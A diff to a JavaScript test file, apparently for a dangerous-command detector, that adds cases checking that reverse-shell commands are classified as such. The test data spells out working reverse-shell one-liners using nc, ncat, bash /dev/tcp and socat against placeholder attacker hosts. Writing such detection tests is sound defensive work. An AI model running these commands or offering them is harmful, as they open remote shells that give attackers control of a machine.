@@ -3533,9 +3533,14 @@ describe("category: reverse-shell", () => {
   it.each([
     ["nc -e /bin/bash", "nc -e /bin/bash evil.com 4444"],
     ["nc -e sh", "nc -e sh attacker.com 1234"],
+    ["ncat -e /bin/bash", "ncat -e /bin/bash evil.com 4444"],
+    ["ncat -e sh", "ncat -e sh attacker.com 1234"],
+    ["nc pipe to bash", "nc evil.com 4444 | bash"],
+    ["ncat pipe to sh", "ncat evil.com 4444 | sh"],
     ["bash /dev/tcp redirect", "bash -i >& /dev/tcp/evil.com/4444 0>&1"],
     ["socat EXEC:bash", "socat EXEC:bash tcp:evil.com:4444"],
     ["socat EXEC:/bin/sh", "socat EXEC:/bin/sh,pty tcp:10.0.0.1:9001"],
+    ["socat SYSTEM:bash PTY", "socat TCP:evil.com:4444 SYSTEM:bash,pty,stderr"],
   ])("blocks %s", (_desc, command) => {
     expect(isDangerousCommand(command)).toBe("reverse-shell");
   });
